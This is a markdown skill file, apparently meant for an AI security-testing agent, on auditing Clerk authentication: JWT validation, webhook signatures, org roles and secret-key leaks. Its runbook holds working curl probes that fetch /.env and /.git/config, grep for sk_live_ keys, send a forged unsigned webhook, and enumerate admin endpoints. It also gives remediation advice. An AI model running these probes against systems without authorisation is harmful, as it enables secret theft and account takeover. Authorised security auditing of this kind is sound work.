---
name: clerk
description: Clerk — session tokens, JWT validation, public-key gotchas, multi-session, OAuth-provider trust, organization roles
triggers: [clerk, clerkjs, useClerk, useUser, currentUser, clerk session, jwt verification, clerk webhooks]
---

# Clerk Security

Clerk is the modern Auth0 competitor for B2B SaaS, especially popular in Next.js + React stacks. It ships sensible defaults but several integration patterns expose bugs: **session JWT validation** (using `__session` cookies, server-side `currentUser()` calls), **public-key validation** (Clerk's JWKS endpoint), **multi-session handling**, **OAuth-provider trust** when chaining Clerk to upstream providers, and **organization (B2B) role checks** that get skipped per-route.

## Attack Surface

### Session JWT (`__session` cookie)
- Clerk sets `__session` cookie containing a JWT signed by Clerk's RSA key
- Server-side: `clerkClient.verifyToken(token)` validates against Clerk's JWKS
- Bug: `jwt.decode(token)` (without verify) trusted for claims
- Bug: missing `iss` validation accepts tokens from a different Clerk Frontend API (cross-app confusion)

### Multi-session
- Clerk supports multiple concurrent sessions in one device (browser)
- Active session ID in `__session` cookie / `__client_uat` cookie
- Bug: server validates the JWT but doesn't check it matches the user's "active" session → stale-token reuse

### OAuth providers (Google / GitHub / etc.)
- Clerk wraps upstream OAuth flows
- Bug: trust of upstream `email_verified` claim — if upstream provider considers email unverified but Clerk treats it as verified, account-takeover via email collision

### Webhook signatures
- Clerk sends webhook events (user.created, user.updated, etc.) with `svix-signature` headers
- Bug: webhook receiver doesn't verify signature → attacker spoofs Clerk-shaped POSTs

### Organization roles
- Clerk's B2B feature: users belong to organizations with roles (admin, basic_member)
- Server checks: `auth().has({permission: 'org:admin'})` — must run on every protected route
- Bug: middleware checks org membership but not the specific permission

### Public vs secret API keys
- Frontend API: `pk_live_...` — public, embedded in client JS
- Backend API: `sk_live_...` — secret, server-side only
- Bug: `sk_live_*` committed to repo / logged / exposed via env-leak → admin-level control of the Clerk tenant

### `getAuth()` vs `currentUser()`
- `getAuth()` returns lightweight session info (userId, sessionId)
- `currentUser()` fetches the full user record from Clerk
- Bug: server treats `getAuth().userId` as trusted but doesn't verify the JWT signature on every request

## Detection Channels

### Fingerprint Clerk
```bash
curl -s 'https://<TARGET>/' | grep -oE 'clerk\.dev|@clerk/nextjs|@clerk/clerk-react|__session|__clerk_db_jwt'

# Cookie names
curl -sI 'https://<TARGET>/' | grep -iE 'set-cookie.*__session|set-cookie.*__client'
```

### Frontend API URL
```bash
# Clerk's frontend API is per-instance:
#   clerk.<INSTANCE>.com — production
#   clerk.<INSTANCE>.lcl.dev — development
#   <random>.clerk.accounts.dev — accounts portal

# Discover via JS bundle inspection
curl -s 'https://<TARGET>/' | grep -oE 'https://clerk\.[a-z0-9.-]+|https://[a-z0-9.-]+\.accounts\.dev'
```

### Session token inspection
```bash
SESSION=$(curl -sI 'https://<TARGET>/' | grep -i 'set-cookie:.*__session' | sed -E 's/.*__session=([^;]+).*/\1/')

# Decode the JWT
echo "$SESSION" | cut -d. -f2 | base64 -d 2>/dev/null | jq
# Look for: iss, aud, sub (Clerk user ID), exp, sid (session ID), nbf
```

### JWKS endpoint
```bash
# Public JWKS at the Frontend API base
curl -s "https://${FRONTEND_API}/v1/jwks" | jq

# Lists Clerk's signing keys; use to manually verify tokens client-side
```

## Operational Runbook

### Step 1 — fingerprint + extract Frontend API
```bash
HTML=$(curl -s 'https://<TARGET>/')
FRONTEND_API=$(echo "$HTML" | grep -oE 'https://clerk\.[a-z0-9.-]+|https://[a-z0-9.-]+\.clerk\.accounts\.dev' | head -1)
echo "Frontend API: $FRONTEND_API"

# Pull tenant config from Frontend API
curl -s "${FRONTEND_API}/v1/environment" | jq
# Reveals: application name, allowed origins, OAuth providers configured, sign-in/sign-up URLs
```

### Step 2 — JWT validation audit
Per oauth_oidc.md JWT testing: alg=none, alg confusion, iss / aud mismatch, expired-token replay.

### Step 3 — secret-key leak
```bash
# Common exposure paths
curl -s 'https://<TARGET>/.env'
curl -s 'https://<TARGET>/.next/server/middleware.js' | grep -oE 'sk_(live|test)_[A-Za-z0-9_-]+'
curl -s 'https://<TARGET>/.git/config'

# In source code (when accessible)
grep -rE 'sk_live_[A-Za-z0-9_-]{40,}' .
```

`sk_live_*` is the Clerk Backend API key — tenant admin access.

### Step 4 — webhook signature bypass probe
```bash
# Identify webhook receivers (when source is available)
grep -rE 'svix-signature|verifyWebhook|Webhook\(' .

# If a webhook handler doesn't verify the signature:
curl -X POST 'https://<TARGET>/api/webhooks/clerk' \
  -H 'svix-id: fake-id' \
  -H 'svix-signature: fake-sig' \
  -H 'svix-timestamp: 1234' \
  -d '{"type":"user.created","data":{"id":"user_attacker"}}'
```

### Step 5 — organization role bypass
```bash
# When you have a low-priv member's session
TOKEN='clerk_session_token'

# Try API endpoints that should require org admin
for endpoint in /api/admin /api/billing /api/team/invite /api/team/remove; do
  STATUS=$(curl -s -o /dev/null -w '%{http_code}' "https://<TARGET>${endpoint}" \
    -H "Authorization: Bearer ${TOKEN}")
  echo "${endpoint}: ${STATUS}"
done
```

### Step 6 — multi-session abuse
```bash
# Sign in as user A; capture __session
# Sign in as user B in another browser; capture __session
# Send user A's __session to user B's app to test session-vs-active-user binding

# Server should reject; vulnerable apps accept the JWT as long as it's signed
```

## Specific Vulnerability Classes

### `getAuth()` mock in tests bleeding to production
- Some Next.js apps mock `getAuth()` in `__tests__` / `__mocks__`
- Bug: misconfigured Jest setup leaves the mock active in `next build`
- All requests return mocked admin context

### `clerkMiddleware` route allow-list
- Next.js + Clerk: `middleware.ts` declares public routes
- Bug: regex too broad (`/api/(.*)` matches everything) → middleware skipped on all `/api/*`

### Webhook payload trust
- Webhook payload arrives with `user.created` event
- App auto-provisions resources for new users
- Bug: signature not verified → attacker fires fake user.created with attacker-chosen userId → resources provisioned in attacker's name

### OAuth-provider email collision
- Clerk allows linking multiple OAuth identities to one user
- Bug: linking flow uses email matching; attacker creates GitHub account with victim's email + low-trust verification → links to victim's account at Clerk

### Org-invitation token reuse
- Org invite emails contain a single-use token
- Bug: token validation doesn't mark-as-used after redemption → replayable

## Bypass Techniques

- **JWT iss verification missing**: tokens from a *different* Clerk Frontend API (your own dev instance) accepted by production
- **`__session` cookie scope confusion**: cookie set on `.app.com` accepted on `.app.com.attacker.com` if SameSite not configured properly
- **Session-touch endpoint**: Clerk's `/v1/touch` extends session TTL; rate-limit bypass
- **Backend API `sk_test_*` in prod**: test-mode keys mistakenly used in prod → test-mode users have different security guarantees

## Validation

1. JWT validation gap: alg=none / forged token accepted.
2. Backend API key (`sk_live_*`) exposed in repo / env.
3. Webhook handler accepts unsigned events.
4. Org-role check missing on a route that should require admin.
5. Multi-session: stale token from a logged-out session still accepted.

## False Positives

- `clerk.dev` references in dev tooling, not production deploys.
- `sk_test_*` keys in commit history (lower-impact than `sk_live_*` but still worth flagging if active).
- Multi-session legitimately accepted by design (some apps allow concurrent sessions).

## Impact

- Account takeover via JWT validation bypass.
- Tenant admin via `sk_live_*` leak → modify any user / org / session.
- Webhook spoofing → resource provisioning under attacker control.
- Org-role bypass → cross-tenant data access.

## Remediation

1. **Server-side `auth().verify()` or `verifyToken()`** on every protected route.
2. **`sk_live_*` from env-var**, never committed.
3. **Webhook signature verification mandatory**: use Clerk's official `Webhook` class.
4. **`clerkMiddleware` with explicit public route list**: deny-by-default.
5. **Org permission checks per route**: `auth().has({permission: 'org:admin'})` not just `auth().has({role: 'org:admin'})`.
6. **Refresh-token rotation enabled**: configure in Clerk dashboard.

## Pro Tips

1. The Frontend API URL is in every Clerk app's page source — pull it first and fetch `/v1/environment` for tenant config.
2. `clerk_session_token` cookie + Authorization Bearer often coexist — both validated server-side.
3. The `currentUser()` API call is server-side authoritative; `useUser()` client-side is just convenience.
4. Clerk's webhook UI shows secret in the dashboard; leak that = signature forgery.
5. `next-auth` and Clerk are sometimes both present in transition periods — audit both auth boundaries.

## Summary

Clerk security is session JWT + Backend API key + webhook signing + org-permission checks. Audit JWT validation server-side, never trust `jwt.decode()`, verify webhook signatures, check `org:permission` not `org:role`.
